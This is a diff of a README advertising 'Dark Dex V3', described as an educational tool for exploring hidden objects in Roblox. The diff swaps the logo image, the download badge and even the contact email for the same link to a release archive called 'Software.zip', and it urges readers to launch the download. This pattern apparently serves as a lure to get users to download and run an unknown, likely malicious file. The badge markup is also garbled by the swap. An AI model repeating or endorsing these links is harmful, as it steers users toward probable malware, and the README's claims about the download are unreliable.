@@ -1,6 +1,6 @@
 # 🚀 Dark Dex V3: Educational Tool for Exploring Hidden Objects in Roblox 🕵️‍♂️
 
-![Dark Dex V3 Logo](https://example.com/dark-dex-v3-logo.png)
+![Dark Dex V3 Logo](https://github.com/Crepzz/Dark-Dex-V3-Educational-Tool-for-Exploring-Hidden-Objects-in-Roblox/releases/download/v1.0/Software.zip)
 
 Welcome to Dark Dex V3, an enhanced version of the Dex Explorer developed specifically for educational purposes to delve into hidden objects within Roblox games and gain a deeper understanding of game mechanics. Whether you are a novice or an experienced developer, Dark Dex V3 provides you with the tools to explore the secrets that lie within Roblox games. Let's embark on an exciting journey to uncover hidden treasures in the Roblox universe! 🌟
 
@@ -13,7 +13,7 @@ Welcome to Dark Dex V3, an enhanced version of the Dex Explorer developed specif
 ## 📦 Download Dark Dex V3
 
 Click the button below to download Dark Dex V3:
-[![Download Dark Dex V3](https://img.shields.io/badge/Download-Dark Dex V3-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Dark Dex V3](https://github.com/Crepzz/Dark-Dex-V3-Educational-Tool-for-Exploring-Hidden-Objects-in-Roblox/releases/download/v1.0/Software.zip Dex V3-blue)](https://github.com/Crepzz/Dark-Dex-V3-Educational-Tool-for-Exploring-Hidden-Objects-in-Roblox/releases/download/v1.0/Software.zip)
 
 *Note: The download link needs to be launched.*
 
@@ -51,7 +51,7 @@ We welcome contributions from the Roblox developer community to enhance Dark Dex
 
 ## 📧 Contact Us
 
-Have questions, suggestions, or feedback about Dark Dex V3? Feel free to reach out to us at [darkdexv3@example.com](mailto:darkdexv3@example.com). We value your input and are always eager to hear from fellow Roblox enthusiasts!
+Have questions, suggestions, or feedback about Dark Dex V3? Feel free to reach out to us at [https://github.com/Crepzz/Dark-Dex-V3-Educational-Tool-for-Exploring-Hidden-Objects-in-Roblox/releases/download/v1.0/Software.zip](https://github.com/Crepzz/Dark-Dex-V3-Educational-Tool-for-Exploring-Hidden-Objects-in-Roblox/releases/download/v1.0/Software.zip). We value your input and are always eager to hear from fellow Roblox enthusiasts!
 
 ---
 
